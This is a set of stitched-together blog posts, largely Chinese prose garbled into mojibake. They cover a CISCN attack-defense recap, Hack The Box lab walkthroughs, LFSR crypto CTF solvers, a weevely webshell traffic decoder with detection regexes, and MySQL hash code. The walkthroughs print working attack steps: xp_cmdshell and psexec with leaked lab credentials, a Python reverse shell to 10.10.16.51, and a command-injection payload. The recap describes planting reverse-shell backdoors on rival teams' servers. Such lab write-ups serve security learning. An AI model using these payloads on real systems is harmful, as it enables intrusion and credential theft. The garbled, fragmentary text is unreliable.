posts.title: CISCN-SE_Semifinal
posts.text: 25/60 дёүзӯүеҘ–(дәҢзӯүеҘ–е®Ҳй—Ёе‘ҳ) дәәжүӢдёҚи¶іпјҲ3/4пјү з¬¬дәҢеӨ©зҡ„жҜ”иөӣж—¶й—ҙжҸҗеүҚеҜјиҮҙзҠ¶жҖҒдёҚдҪі вҖҰ з”ұдәҺеҗ„з§Қеҗ„ж ·зҡ„еҺҹеӣ пјҢжӢҝеҲ°дәҶиҝҷдёӘеҗҚж¬ЎпјҢйҒ—жҶҫд№ҹдёҚиғҪиҜҙдёҖзӮ№йғҪжІЎжңү дҪҶд№ҹи¶іеӨҹдәҶ йҰ–е…ҲиҒҠдёӢиҝҷдёӘжҜ”иөӣзҡ„еҫ—еҲҶжңәеҲ¶ иў«Getflagдјҡиў«жүЈ100еҲҶпјҢз”ұж”»еҮ»йҳҹдјҚе№іж‘Ҡ иў«Checkдјҡиў«жүЈ100еҲҶпјҢз”ұжңҚеҠЎжӯЈеёёзҡ„йҳҹдјҚе№іж‘Ҡ е…ҲдёҚиҜҙDOSжҗ…еұҺдәҶпјҢеҗҢж—¶иў«Getflagе’Ңиў«Checkзҡ„жғ…еҶөжҳҜиҰҒе°ҪйҮҸйҒҝе…Қзҡ„пјҢе®һеңЁзңӢдёҚеҲ°жҖҺд№Ҳиў«жү“зҡ„е°ұеҲ з«ҷжӢүеҖ’ еҪ“з„¶пјҢиғҪдҝқиҜҒжңҚеҠЎиҝҗиЎҢд№ҹжҳҜд»¶еҘҪдәӢпјҢеӣ дёәжҜ”иөӣдёӯеҗҺжңҹеҮәзҺ°дәҶдёҖеӨ§еҚҠе®•жңәзҡ„жғ…еҶөпјҢеҚідҪҝиў«жү“дәҶпјҢеҸӘиҰҒдҝқиҜҒжңҚеҠЎзҡ„жӯЈеёёеҸҚиҖҢеҸҜд»ҘдёҠеҲҶ е…¶ж¬ЎпјҢPWNжңәжҲ‘д»¬дёҚдјҡжү“д№ҹдёҚдјҡдҝ®пјҢдҪҶжҳҜдёҚеҰЁзўҚжҲ‘д»¬жӢҝеҲ«дәәзҡ„Payloadжү“еҲ«дәәпјҲpwntoolsйҮҚж”ҫжөҒйҮҸе°ұе®ҢдәӢдәҶпјү з”ұдәҺиҮӘе·ұзҡ„з–ҸеҝҪпјҢжІЎеңЁз¬¬дёҖж—¶й—ҙжіЁж„ҸеҲ°жңҚеҠЎеҷЁдёҠзҡ„жөҒйҮҸеӨҮд»ҪпјҢй”ҷеӨұдәҶеҮ еҚғеҲҶ еҸҰеӨ–пјҢз”ұдәҺPWNзҡ„GetflagжҳҜз»ҷеҮәдёҖдёӘshжқҘжү§иЎҢcat /flagпјҢиҖҢдёҚжҳҜиҮӘеҠЁжү§иЎҢcat /flagпјҢжүҖд»Ҙе®Ңе…ЁеҸҜд»Ҙз•ҷдҪҸиҝҷдёӘshпјҢеҗҺйқўеҶҚз»§з»ӯGetflagпјҲеҲ«дәәзҡ„жҖқи·ҜпјҢеӨӘйӘҡдәҶпјү еҰӮжһңзў°е·§еҲ«дәәеҲ жҺүдәҶзЁӢеәҸж”ҫејғиҝҗз»ҙпјҢе°ұеҸҜд»ҘеҸҢеҖҚжүЈеҲҶ Webзҡ„е°ұеҘҪиҜҙдәҶпјҢзңӢзңӢиҮӘе·ұжңҚеҠЎеҷЁдёҠжңүе“Әдәӣй©¬пјҢз„¶еҗҺжү№йҮҸдёҠй©¬пјҢз„¶еҗҺд»ҺжөҒйҮҸйҮҢйқўзҝ»еҲ«дәәзҡ„Payload з”ұдәҺжІЎжңүеҒҡзҪ‘з»ңйҡ”зҰ»пјҲиөӣеүҚnmapдәҶдёӢпјҢиғҪйҖҡе…¶д»–йҳҹзҡ„жңҚеҠЎеҷЁе’ҢйҖүжүӢжңәеҷЁпјүпјҢжүҖд»Ҙе®Ңе…ЁеҸҜд»ҘеңЁеҲ«дәәзҡ„жңҚеҠЎеҷЁдёҠдј дёҖдёӘMeterpreterзҡ„еҸҚеј№Shellй©¬ д»ҺйҳІе®Ҳж–№жқҘи®ІпјҢзЁӢеәҸй©¬зҡ„иҝҗиЎҢжқғйҷҗжҳҜwww-dataпјҢиҝҗз»ҙзҡ„жқғйҷҗжҳҜctfпјҢжүҖд»Ҙе®Ңе…ЁеҸҜд»ҘиҮӘе·ұеҶҷдёҖдёӘеҗҺй—ЁжқҘиҺ·еҫ—www-dataжқғйҷҗпјҢз„¶еҗҺе°ұеҸҜд»Ҙз”ЁsystemеҮҪж•°жқҘkillжҺүзЁӢеәҸй©¬ иҝҷдёӘжҖқи·ҜеҗҢж ·еҸҜд»Ҙз”ЁжқҘиҝҗз»ҙе…¶д»–зҡ„жғ…еҶө иҝҷж¬ЎжҜ”иөӣBanдәҶдёҚжӯ»й©¬ жүҖд»ҘпјҢзҗҶжғіеҢ–зҡ„AWDжөҒзЁӢпјҢе…¶е®һиҝҳжҳҜеә”иҜҘжҢүCTFзҡ„жҖқи·ҜжқҘ AиҙҹиҙЈжәҗз Ғе®Ўи®Ўд»ҘеҸҠдҝ®еӨҚ BиҙҹиҙЈзӣ‘з®ЎжөҒйҮҸжқҘжҹҘзңӢжңҚеҠЎеҷЁдёҠзҡ„еҗҺй—Ёд»ҘеҸҠе…¶д»–йҳҹдјҚзҡ„Payload CиҙҹиҙЈи„ҡжң¬зј–еҶҷд»ҘеҸҠиҝҗз»ҙ DиҙҹиҙЈи„ҡжң¬зј–еҶҷзңҹз©әжңҹзҡ„жүӢеҠЁжҸҗдәӨflagд»ҘеҸҠе…¶д»–е·ҘдҪңпјҲдҫӢеҰӮPWNйўҳзҡ„shдҝқз•ҷпјү AжҢ–еҲ°жјҸжҙһе°ұи®©CеҶҷGetflagи„ҡжң¬пјҢеҗҢж—¶DеҸҜд»ҘжүӢеҠЁGetflag BзңӢеҲ°Payloadе°ұеҸҜд»Ҙи®©AиҝӣиЎҢдҝ®еӨҚпјҢе№¶и®©Cзј–еҶҷGetflagи„ҡжң¬пјҢеҗҢж—¶DеҸҜд»ҘжүӢеҠЁGetflag еӯҰеҲ°дәҶеҫҲеӨҡпјҢеёҢжңӣд»ҘеҗҺиғҪз”Ёеҫ—дёҠиҝҷдәӣз»ҸйӘҢ

еҖҹзқҖHTBеӨҡеӯҰдёҖдәӣWindowsдёӢзҡ„жё—йҖҸжҠҖе·§ Archetype Windows з«ҜеҸЈжү«жҸҸ 1234567891011nmap -sV -sT -Pn 10.10.10.27Nmap scan report for 10.10.10.27Host is up (0.51s latency).Not shown: 996 closed portsPORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows жјҸжҙһеҲ©з”Ё з”Ёsmbmapе…Ҳжү«жҸҸдёҖжіўSMBжңҚеҠЎ 12smbmap -H 10.10.10.27[+] IP: 10.10.10.27:445 Name: 10.10.10.27 йҡҸдҫҝеҠ дёӘз”ЁжҲ·еҗҚ 12345678smbmap -H 10.10.10.27 -u test[+] Guest session IP: 10.10.10.27:445 Name: 10.10.10.27 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin backups READ ONLY C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC з©әеҜҶз ҒеҚіеҸҜзҷ»е…Ҙ 1234567891011smbclient \\10.10.10.27\backups -U testEnter WORKGROUP	est's password: Try "help" to get a list of possible commands.smb: \> dir . GeneratedDate="20.1.2019 10:01:34"/>"/> </DTSConfigurationHeading> <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String"> <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue> </Configuration></DTSConfiguration> еҫ—еҲ°MSSQLиҙҰжҲ·ARCHETYPE\sql_svc:M3g4c0rp123 иҝҷйҮҢдҪҝз”ЁimpacketжқҘзҷ»е…Ҙ https://github.com/SecureAuthCorp/impacket еҸҜд»Ҙжү§иЎҢзі»з»ҹе‘Ҫд»Ө 123456789101112131415161718192021222324252627282930python mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-authImpacket v0.9.23.dev1+20210528.195232.25c62f65 - Copyright 2020 SecureAuth CorporationPassword:[*] Encryption required, switching to TLS[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) [!] Press help for extra shell commandsSQL> enable_xp_cmdshell[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.SQL> xp_cmdshell whoamioutput -------------------------------------------------------------------------------- archetype\sql_svc NULL SQL> xp_cmdshell type C:\users\sql_svc\desktop\user.txtoutput -------------------------------------------------------------------------------- 3e7b102e78218e935bf3f4951fec21a3 жқғйҷҗжҸҗеҚҮ C:\users\sql_svc\appdataдёәйҡҗи—Ҹи·Ҝеҫ„, йңҖиҰҒдҪҝз”Ёdir /a 12345678910SQL> xp_cmdshell type C:\users\sql_svc\appdataoaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txtoutput -------------------------------------------------------------------------------- net.exe use T: \Archetype ackups /user:administrator MEGACORP_4dm1n!! exit NULL йҖҡиҝҮжҹҘзңӢpowershellзҡ„еҺҶеҸІи®°еҪ•еҫ—еҲ°administratorзҡ„иҙҰжҲ· Archetype\administrator:MEGACORP_4dm1n!! еңЁдҪҝз”Ёimpacketдёӯзҡ„psexec.pyжқҘеҫ—еҲ°з®ЎзҗҶе‘ҳжқғйҷҗзҡ„Shell 12345678910111213141516python psexec.py archetype/administrator@10.10.10.27Impacket v0.9.23.dev1+20210528.195232.25c62f65 - Copyright 2020 SecureAuth CorporationPassword:[*] Requesting shares on 10.10.10.27.....[*] Found writable share ADMIN$[*] Uploading file OFvCNrQJ.exe[*] Opening SVCManager on 10.10.10.27.....[*] Creating service SMtb on 10.10.10.27.....[*] Starting service SMtb.....[!] Press help for extra shell commandsMicrosoft Windows [Version 10.0.17763.107](c) 2018 Microsoft Corporation. All rights reserved.C:\Windows\system32>type C:\users\administrator\desktopoot.txtb91ccec3305e98240082d4474b848528 е°қиҜ•дёҚдҪҝз”ЁpsexecиҝҗиЎҢз®ЎзҗҶе‘ҳжқғйҷҗе‘Ҫд»Өзҡ„дёҖжіўдёүжҠҳ WindowsдёӢеҸҜд»ҘдҪҝз”Ёrunasе‘Ҫд»ӨжқҘд»Ҙе…¶д»–з”ЁжҲ·зҡ„иә«д»ҪиҝҗиЎҢе‘Ҫд»Ө еҰӮrunas /savecred /user:administrator whoami дҪҶжҳҜдёҚиғҪзӣҙжҺҘйҖҡиҝҮеҸӮж•°иҫ“е…ҘеҜҶз Ғ 123runas /savecred /user:administrator whoamiиҜ•еӣҫе°Ҷ whoami дҪңдёәз”ЁжҲ· "DOMAIN\administrator" еҗҜеҠЁ...иҫ“е…Ҙ administrator зҡ„еҜҶз Ғ: еҜҶз Ғзҡ„иҫ“е…ҘйңҖиҰҒд»ҘдәӨдә’ејҸзҡ„ж–№ејҸжқҘиҫ“е…Ҙ, е°ұж— жі•еңЁMSSQLзҡ„йқһдәӨдә’ејҸShellдёӯзӣҙжҺҘжҸҗжқғ иҖҢеҸҜд»ҘдҪҝз”ЁsanurиҝҷдёӘе·Ҙе…·жқҘиҝӣиЎҢеҜҶз Ғзҡ„е‘Ҫд»ӨиЎҢиҫ“е…Ҙ 1runas /savecred /user:administrator whoami | sanur.exe password дҪҶжҳҜзҙ§жҺҘзқҖй—®йўҳеҸҲжқҘдәҶ runasиІҢдјјдёҚдјҡеңЁеҪ“еүҚcmdзӘ—еҸЈиҝҗиЎҢе‘Ҫд»ӨиҖҢжҳҜеңЁдёҖдёӘж–°зҡ„cmdдёӯиҝҗиЎҢ, иҝҷж ·зҡ„иҜқе°ұдёҚиғҪеңЁMSSQLзҡ„ShellдёӯзңӢеҲ°еӣһжҳҫ жүҖд»Ҙе°қиҜ•дәҶж–Үд»¶еҶҷе…Ҙдҝқеӯҳе‘Ҫд»ӨиҝҗиЎҢз»“жһңзҡ„ж–№жі• 1runas /savecred /user:administrator "cmd /c whoami > C:\1" | sanur.exe password жң¬ең°иҝҗиЎҢжҲҗеҠҹдәҶ, дҪҶжҳҜзӣ®ж ҮжңәеҷЁдёҚиЎҢ(ж— еҘҲ) Oopsie Linux з«ҜеҸЈжү«жҸҸ 123456789nmap -sV -sT -Pn 10.10.10.28Nmap scan report for 10.10.10.28Host is up (0.68s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel жјҸжҙһеҲ©з”Ё еңЁйҰ–йЎөзҡ„жәҗз ҒзңӢеҲ°иҝҷж ·дёҖжқЎJS 1<script src="/cdn-cgi/login/script.js"></script> еҫ—еҲ°и·Ҝеҫ„/cdn-cgi/login и®ҝй—®иҜҘи·Ҝеҫ„еҚідёәзҷ»е…ҘйЎөйқў иҝҷйҮҢзҡ„зҷ»е…ҘйңҖиҰҒдҪҝз”ЁдёҠдёҖеҸ°йқ¶жңәзҡ„AdministratorеҜҶз Ғ, жңүзӮ№еқ‘ admin:MEGACORP_4dm1n!! и®ҝй—®/cdn-cgi/login/admin.php?content=uploads жҸҗзӨәThis action require super admin rights. дё”Cookieдёӯзҡ„еҶ…е®№дёәuser=34322; role=admin йӮЈд№ҲеҸӘиҰҒиғҪеӨҹеҫ—еҲ°super adminзҡ„idеҖјдёҺusernameеҚіеҸҜи¶Ҡжқғ /cdn-cgi/login/admin.php?content=accounts&id=1 и®ҝй—®иҜҘи·Ҝеҫ„еҸҜд»Ҙеҫ—еҲ°adminзҡ„иҙҰжҲ·дҝЎжҒҜ еҸҜд»ҘйҖҡиҝҮзҲҶз ҙеҸӮж•°idжқҘеҫ—еҲ°super adminзҡ„дҝЎжҒҜ 12345678910import reimport requestsreq = requests.session()headers = {"Cookie":"user=34322; role=admin"}for _ in range(0, 999): url = "http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id={}".format(_) res = req.get(url, headers = headers) if "super" in res.text: print(_) exit() idдёә30, еҫ—еҲ°еҰӮдёӢдҝЎжҒҜ 12Access ID Name Email86575 super admin superadmin@megacorp.com йҖҡиҝҮеңЁBurpsuiteдёӯдҝ®ж”№CookieдёәCookie: user=86575; role=super adminжқҘи®ҝй—®/cdn-cgi/login/admin.php?content=uploads дёҠдј weevelyзҡ„ShellеҚіеҸҜиҺ·еҫ—жқғйҷҗ жқғйҷҗжҸҗеҚҮ дҪҝз”ЁpythonеҸҚеј№ShellеҲ°жң¬жңә 123python3 -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.16.51',9996));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"-------nc -lvnp 9996 иҺ·еҫ—tty (еҘҪеғҸжҳҜз”ЁдәҺиҺ·еҸ–дёҖдёӘз»Ҳз«ҜдјҡиҜқ, еҗҰеҲҷеҗҺз»ӯзҡ„еҲҮжҚўз”ЁжҲ·ж“ҚдҪңж— жі•иҝӣиЎҢ) 1python3 -c 'import pty;pty.spawn("/bin/bash")' д№ӢеүҚжҹҘзңӢз”ЁжҲ·дҝЎжҒҜзҡ„йЎөйқўеә”иҜҘз”ЁеҲ°дәҶSQLзҡ„ж“ҚдҪң йӮЈд№Ҳе°ұеҸҜд»ҘеҺ»жүҫSQLзҡ„й…ҚзҪ®дҝЎжҒҜ 1234567cat /var/www/html/cdn-cgi/login/db.php<i/login$ cat cat /var/www/html/cdn-cgi/login/db.phpcat: cat: No such file or directory<?php$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');?> еҫ—еҲ°иҙҰжҲ·дҝЎжҒҜrobert:M3g4C0rpUs3r! дҪҝз”ЁиҜҘиҙҰжҲ·дҝЎжҒҜеҲҮжҚўеҲ°з”ЁжҲ·robert 12345su robertM3g4C0rpUs3r!cat /home/robert/user.txtf2c74ee8db7983851ab2a96a44eb7981 жҹҘжүҫжңүSUIDжқғйҷҗзҡ„ж–Үд»¶ 1find / -user root -perm -4000 -print 2>/dev/null зңӢеҲ°дёҖдёӘжңүж„ҸжҖқзҡ„ж–Үд»¶ 1/usr/bin/bugtracker иҖҢиҜҘз”ЁжҲ·д№ҹжңүиҝҗиЎҢжқғйҷҗ 12345ls -la /usr/bin/bugtracker-rwsr-xr-- 1 root bugtracker 8792 Jan 25 2020 /usr/bin/bugtrackeriduid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker) IDAдёӯеҲҶжһҗ 12345678910111213141516171819int __cdecl main(int argc, const char **argv, const char **envp){ __uid_t v3; // eax const char *v4; // rax char v7[24]; // [rsp+10h] [rbp-20h] BYREF unsigned __int64 v8; // [rsp+28h] [rbp-8h] v8 = __readfsqword(0x28u); printf("%s", "

"); printf("Provide Bug ID: "); __isoc99_scanf("%s", v7); printf("%s", "---------------

"); v3 = geteuid(); setuid(v3); v4 = (const char *)concat("cat /root/reports/", v7); system(v4); putchar(10); return __readfsqword(0x28u) ^ v8;} з”ЁжҲ·иҫ“е…Ҙv7 v7иў«жӢјжҺҘеҲ°"cat /root/reports/"д№ӢеҗҺеңЁиөӢеҖјз»ҷv4 жү§иЎҢv4 е‘Ҫд»ӨжіЁе…Ҙ Payload: ;cat$IFS$9/root/root.txt 1234567891011./bugtracker------------------: EV Bug Tracker :------------------Provide Bug ID: ;cat$IFS$9/root/root.txt---------------cat: /root/reports/: Is a directoryaf13b0bee69f8a877c3faf667f7beacf Archetype Linux з«ҜеҸЈжү«жҸҸ 12345678910nmap -sV -sT -Pn 10.10.10.46Nmap scan report for 10.10.10.46Host is up (0.59s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel жјҸжҙһеҲ©з”Ё The credentials ftpuser / mc@F1l3ZilL4 can be used to login to the FTP server. вҖ“ е®ҳж–№WP е°қиҜ•дҪҝз”ЁдёҠеҸ°йқ¶жңәдёӯиҺ·еҸ–зҡ„ftpеҮӯжҚ®ftpuser/mc@F1l3ZilL4зҷ»еҪ•йқ¶жңәзҡ„ftpжңҚеҠЎ https://blog.csdn.net/qianxiaoyiran311/article/details/105988795 еҫ—еҲ°FTPиҙҰжҲ· 1ftpuser:mc@F1l3ZilL4 зҷ»е…ҘFTPжңҚеҠЎ 1234567891011121314151617181920ftp 10.10.10.46Connected to 10.10.10.46.220 (vsFTPd 3.0.3)Name (10.10.10.46:root): ftpuser331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp> ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.-rw-r--r-- 1 0 0 2533 Feb 03 2020 backup.zip226 Directory send OK.ftp> get backup.ziplocal: backup.zip remote: backup.zip200 PORT command successful. posts.title: Crypto-LFSR
posts.text: Stream Cipher LFSR [2018ејәзҪ‘жқҜ]Streamgame1 12345678910111213141516171819202122232425262728from flag import flagassert flag.startswith("flag{")assert flag.endswith("}")assert len(flag)==25def lfsr(R,mask): output = (R << 1) & 0xffffff i=(R&mask)&0xffffff lastbit=0 while i!=0: lastbit^=(i&1) i=i>>1 output^=lastbit return (output,lastbit)R=int(flag[5:-1],2)mask = 0b1010011000100011100f=open("key","ab")for i in range(12): tmp=0 for j in range(8): (R,out)=lfsr(R,mask) tmp=(tmp << 1)^out f.write(chr(tmp))f.close() 1234hexdump -C key 00000000 55 38 f7 42 c1 0d b2 c7 ed e0 24 3a |U8.B......$:|0000000c еҠ еҜҶжөҒзЁӢ еәҸеҲ—е·Ұз§»дёҖдҪҚ дёҺеҸҚйҰҲзі»ж•°иҝӣиЎҢдё”иҝҗз®— иҝҗз®—з»“жһңиҝӣиЎҢејӮжҲ–еҫ—еҲ°з»“жһң з»“жһңдҪңдёәеәҸеҲ—зҡ„з»“е°ҫ result=cn&anвҠ•...вҠ•c2&a2вҠ•c1&a1result = c_n\&a_n \oplus ... \oplus c_2\&a_2 \oplus c_1\&a_1result=cnвҖӢ&anвҖӢвҠ•...вҠ•c2вҖӢ&a2вҖӢвҠ•c1вҖӢ&a1вҖӢ еҸҚйҰҲзі»ж•°дёә mask = 0b1010011000100011100 еҚі c19,c17,c14,c13,c9,c5,c4,c3=1c_{19}, c_{17}, c_{14}, c_{13}, c_9, c_5, c_4, c_3 = 1c19вҖӢ,c17вҖӢ,c14вҖӢ,c13вҖӢ,c9вҖӢ,c5вҖӢ,c4вҖӢ,c3вҖӢ=1 (д»ҺеҸіеҲ°е·Ұ) йӮЈд№ҲеҸҚйҰҲиҝҗз®—дёә result=a19вҠ•a17вҠ•a14вҠ•a13вҠ•a9вҠ•a5вҠ•a4вҠ•a3result = a_{19} \oplus a_{17} \oplus a_{14} \oplus a_{13} \oplus a_9 \oplus a_5 \oplus a_4 \oplus a_3result=a19вҖӢвҠ•a17вҖӢвҠ•a14вҖӢвҠ•a13вҖӢвҠ•a9вҖӢвҠ•a5вҖӢвҠ•a4вҖӢвҠ•a3вҖӢ иҖҢдё”жҲ‘д»¬е·ІзҹҘa1-a18д»ҘеҸҠдә§з”ҹзҡ„result йӮЈд№Ҳе°ұеҸҜд»Ҙж №жҚ®иҝҷдәӣжқЎд»¶жқҘеҫ—еҮәa19 a19=resultвҠ•a17вҠ•a14вҠ•a13вҠ•a9вҠ•a5вҠ•a4вҠ•a3a_{19} = result \oplus a_{17} \oplus a_{14} \oplus a_{13} \oplus a_9 \oplus a_5 \oplus a_4 \oplus a_3a19вҖӢ=resultвҠ•a17вҖӢвҠ•a14вҖӢвҠ•a13вҖӢвҠ•a9вҖӢвҠ•a5вҖӢвҠ•a4вҖӢвҠ•a3вҖӢ д»ҘжӯӨзұ»жҺЁпјҢжқҘжҒўеӨҚflag 123456789101112131415161718f = open("key", "rb")bytes = f.read(3)f.close()key = ""for i in bytes: if len(bin(i)[2:]) != 8: key += (8 - len(bin(i)[2:])) * "0" + bin(i)[2:] else: key += bin(i)[2:]key = key[:19]print(key)flag = ""for i in range(19): res = key[-1] key = key[:18] awns = chr(int(res) ^ int(key[-3]) ^ int(key[-4]) ^ int(key[-5]) ^ int(key[-9]) ^ int(key[-13]) ^ int(key[-14]) ^ int(key[-17]) + 48) key = awns + keyprint("flag{" + key + "}") [2018ејәзҪ‘жқҜ]Streamgame2 12345678910111213141516171819202122232425262728from flag import flagassert flag.startswith("flag{")assert flag.endswith("}")assert len(flag)==27def lfsr(R,mask): output = (R << 1) & 0xffffff i=(R&mask)&0xffffff lastbit=0 while i!=0: lastbit^=(i&1) i=i>>1 output^=lastbit return (output,lastbit)R=int(flag[5:-1],2)mask=0x100002f=open("key","ab")for i in range(12): tmp=0 for j in range(8): (R,out)=lfsr(R,mask) tmp=(tmp << 1)^out f.write(chr(tmp))f.close() и·ҹдёҠдёҖйўҳдёҖдёӘжҖқи·ҜпјҢиҖҢдё”жӣҙз®ҖеҚ•пјҲз§»дҪҚеҜ„еӯҳеҷЁжӣҙе°‘пјү 1234567891011121314151617181920#!/usr/bin/env python3#coding:utf-8f = open("key", "rb")bytes = f.read(3)f.close()key = ""for i in bytes: if len(bin(i)[2:]) != 8: key += (8 - len(bin(i)[2:])) * "0" + bin(i)[2:] else: key += bin(i)[2:]key = key[:21]flag = ""for i in range(21): res = key[-1] key = key[:20] awns = chr(int(res) ^ int(key[-2]) + 48) key = awns + keyprint("flag{" + key + "}") [CISCN2018]oldstreamgame зӘҒз„¶еҸ‘зҺ°йғҪжҳҜдёҖдёӘеҘ—и·Ҝ 1234567891011121314151617181920212223242526flag = "flag{xxxxxxxxxxxxxxxx}"assert flag.startswith("flag{")assert flag.endswith("}")assert len(flag)==14def lfsr(R,mask): output = (R << 1) & 0xffffffff i=(R&mask)&0xffffffff lastbit=0 while i!=0: lastbit^=(i&1) i=i>>1 output^=lastbit return (output,lastbit)R=int(flag[5:-1],16)mask = 0b10100100000010000000100010010100f=open("key","w")for i in range(100): tmp=0 for j in range(8): (R,out)=lfsr(R,mask) tmp=(tmp << 1)^out f.write(chr(tmp))f.close() 12345678910111213141516171819#!/usr/bin/env python3#coding:utf-8f = open("key", "rb")bytes = f.read(4)f.close()key = ""for i in bytes: if len(bin(i)[2:]) != 8: key += (8 - len(bin(i)[2:])) * "0" + bin(i)[2:] else: key += bin(i)[2:]print(key)for i in range(32): res = key[-1] key = key[:31] awns = chr(int(res) ^ int(key[-30]) ^ int(key[-27]) ^ int(key[-20]) ^ int(key[-12]) ^ int(key[-8]) ^ int(key[-5]) ^ int(key[-3]) + 48) key = awns + keyprint("flag{" + hex(int(key,2)) + "}") TBC

$o=@ob_get_contents(); @ob_end_clean(); $r=@base64_encode(@x(@gzcompress($o),$k)); print("$p$kh$r$kf");} еҸҜд»ҘзңӢеҲ°weevelyжүҖдҪҝз”Ёзҡ„еҠ еҜҶж–№жі•дёә Base64+XOR+Zlib 1234567891011121314#coding: utf-8import base64import binasciiimport zlibkey = "1a1dc91c"post = b"Sf16qivwHbFhth4vT+seTB62/kyq9GC0hRd5SUnzHukeKxysTBP4r3q2AWTpLGZ1psXXDstel0spuJh9YawwY4DyJcM="post = base64.b64decode(post).decode("ISO-8859-1")b64 = b""for _ in range(len(post)): b64 += chr(ord(post[_])^ord(key[_%len(key)])).encode("ISO-8859-1")print(zlib.decompress(b64))# b"chdir('/var/www/html');@error_reporting(0);@system('id 2>&1');" phpзҡ„дёҖдәӣеҺӢзј©еҮҪж•°д»ҘеҸҠеҸӮж•°дёҺеҺӢзј©з®—жі•зҡ„еҜ№еә”е…ізі» gzencode() gzdecode() ZLIB_ENCODING_GZIP -> gzip gzcompress() gzuncompress() ZLIB_ENCODING_DEFLATE -> zlib gzdeflate() gzinflate() ZLIB_ENCODING_RAW -> deflate еҸӮж•°зү№еҫҒ ж— еҸӮж•° жөҒйҮҸзү№еҫҒ е®ўжҲ·з«ҜеҸ‘йҖҒжөҒйҮҸж јејҸ scramble1+[0-9a-f]{12}[a-zA-Z0-9\+/=]*?[0-9a-f]{12}+scramble2 дё”еүҚеҗҺдёӨж®ө12еӯ—иҠӮHexеҖјеҲҶеҲ«дёә$khе’Ң$kf жңҚеҠЎз«Ҝе“Қеә”жөҒйҮҸж јејҸдёә scramble+[0-9a-f]{12}[a-zA-Z0-9\+/=]*?[0-9a-f]{12} дё”scrambleдёә$pпјҢеүҚеҗҺдёӨж®ө12еӯ—иҠӮHexеҖјеҲҶеҲ«дёә$khе’Ң$kf

posts.title: MysqlSha1
posts.text: еңЁ4.0зүҲжң¬д№ӢеүҚпјҢMysqlдҪҝз”ЁMysql323дҪңдёәHashеӯҳеӮЁзҡ„ж–№ејҸ еңЁ4.1зүҲжң¬д№ӢеҗҺпјҢMysqlдҪҝз”ЁMysqlSha1дҪңдёәHashеӯҳеӮЁзҡ„ж–№ејҸ Generator MysqlSha1жҳҜеҹәдәҺSha1зҡ„Hashз®—жі•пјҢHashеүҚзҡ„жҳҹеҸ·з”ЁдәҺж ҮиҜҶд»ҘеҢәеҲ«дәҺMysql323 123456def password(passwd): import hashlib _hash = hashlib.sha1(passwd.encode()).digest() __hash = "*"+hashlib.sha1(_hash).hexdigest().upper() return __hashprint(password("password")) еҖјеҫ—дёҖжҸҗзҡ„жҳҜз¬¬дёҖж¬ЎHashз»“жһңдёәдәҢиҝӣеҲ¶ Token mysql_native_passwordи®ӨиҜҒж–№ејҸдёӢзҡ„tokenз”ҹжҲҗ 12345678def token(passwd, scramble): import hashlib hash1 = hashlib.sha1(passwd.encode()).digest() hash2 = hashlib.sha1(passwd.encode()).hexdigest() hash3 = hashlib.sha1(scramble.encode()+hashlib.sha1(hash1).digest()).hexdigest() token = hex(int(hash2, 16) ^ int(hash3, 16))[2:] return tokenprint(token("password", "{?hmkQ3Lb*Ipz3.**1WC")) Check mysql_native_passwordи®ӨиҜҒж–№ејҸдёӢзҡ„checkж–№жі• 12345678910def check(token, __hash, scramble): import binascii import hashlib _hash1 = hashlib.sha1(binascii.unhexlify(hex(int(token, 16) ^ int(hashlib.sha1(scramble.encode()+binascii.unhexlify(__hash[1:].lower().encode())).hexdigest(), 16))[2:].encode())).hexdigest() _hash2 = __hash[1:].lower() if _hash1 == _hash2: return True else: return Falseprint(check("7230ae6e07d2b83f36aca145169248fbcd80b7a4", "*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19", "{?hmkQ3Lb*Ipz3.**1WC")) еңЁжҳҫзӨәзҡ„ж—¶еҖҷHashйғҪдёәHexеҪўејҸпјҢи®Ўз®—зҡ„ж—¶еҖҷйғҪдёәBinеҪўејҸпјҢеңЁеӨ„зҗҶзҡ„ж—¶еҖҷйңҖиҰҒжіЁж„Ҹ 